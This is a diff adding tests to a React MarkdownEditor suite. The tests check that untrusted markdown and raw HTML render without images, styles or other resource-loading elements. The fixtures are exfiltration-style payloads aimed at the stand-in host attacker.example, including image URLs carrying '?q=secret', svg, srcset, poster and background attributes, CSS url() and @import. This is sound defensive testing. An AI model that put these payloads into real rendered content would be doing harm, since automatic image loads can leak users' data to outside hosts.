@@ -106,6 +106,84 @@ describe("MarkdownEditor", () => {
 
     unmount();
   });
+
+  test("renders untrusted images and raw HTML without resource-loading elements or attributes", () => {
+    const { container, render, unmount } = renderIntoContainer(
+      <MarkdownEditor
+        content={[
+          "![inline](https://attacker.example/inline.png?q=secret)",
+          "![reference][logo]",
+          "[logo]: https://attacker.example/reference.png",
+          '<img src="https://attacker.example/raw.png">',
+          '<picture><source srcset="https://attacker.example/s.png"></picture>',
+          '<svg><image href="https://attacker.example/svg.png"></image></svg>',
+          '<video poster="https://attacker.example/poster.png"></video>',
+          '<table background="https://attacker.example/table.png"><tr><td>t</td></tr></table>',
+          '<p style="background:url(https://attacker.example/bg.png)">styled</p>',
+          '<style>@import "https://attacker.example/x.css";</style>',
+          "&lt;img src=https://attacker.example/entity.png&gt;",
+          "| a |\n|:-:|\n| b |",
+          "```sql\nSELECT 1;\n```",
+        ].join("\n\n")}
+        mode="preview"
+        untrusted
+      />
+    );
+    render();
+
+    expect(
+      container.querySelector(
+        "img, picture, source, svg, image, video, audio, iframe, object, embed, link, style, [src], [srcset], [poster], [background], [style]"
+      )
+    ).toBeNull();
+    expect(container.querySelector("[class]:not(.markdown-body)")).toBeNull();
+    const imageLinks = Array.from(container.querySelectorAll("a"))
+      .filter((link) => ["inline", "reference"].includes(link.textContent ?? ""))
+      .map((link) => [link.textContent, link.getAttribute("href"), link.getAttribute("target")]);
+    expect(imageLinks).toEqual([
+      ["inline", "https://attacker.example/inline.png?q=secret", "_blank"],
+      ["reference", "https://attacker.example/reference.png", "_blank"],
+    ]);
+    expect(container.textContent).toContain(
+      '<img src="https://attacker.example/raw.png">'
+    );
+    expect(container.querySelector("td")?.textContent).toBe("b");
+    expect(container.querySelector("pre code")?.textContent).toBe("SELECT 1;\n");
+    unmount();
+  });
+
+  test("keeps images and HTML in ordinary text", () => {
+    const { container, render, unmount } = renderIntoContainer(
+      <MarkdownEditor
+        content={"![chart](https://example.com/chart.png)\n\n<details>more</details>"}
+        mode="preview"
+      />
+    );
+    render();
+
+    expect(container.querySelector("img")?.getAttribute("src")).toBe(
+      "https://example.com/chart.png"
+    );
+    expect(container.querySelector("details")).not.toBeNull();
+    unmount();
+  });
+
+  test("renders an untrusted draft's preview tab without images", () => {
+    const { container, render, unmount } = renderIntoContainer(
+      <MarkdownEditor
+        content="![chart](https://attacker.example/leak.png)"
+        onChange={vi.fn()}
+        untrusted
+      />
+    );
+    render();
+    const tabs = container.querySelectorAll<HTMLButtonElement>('[role="tab"]');
+    act(() => tabs[1].click());
+
+    expect(container.querySelector('[role="tabpanel"] a')).not.toBeNull();
+    expect(container.querySelector("img")).toBeNull();
+    unmount();
+  });
 });
 
 
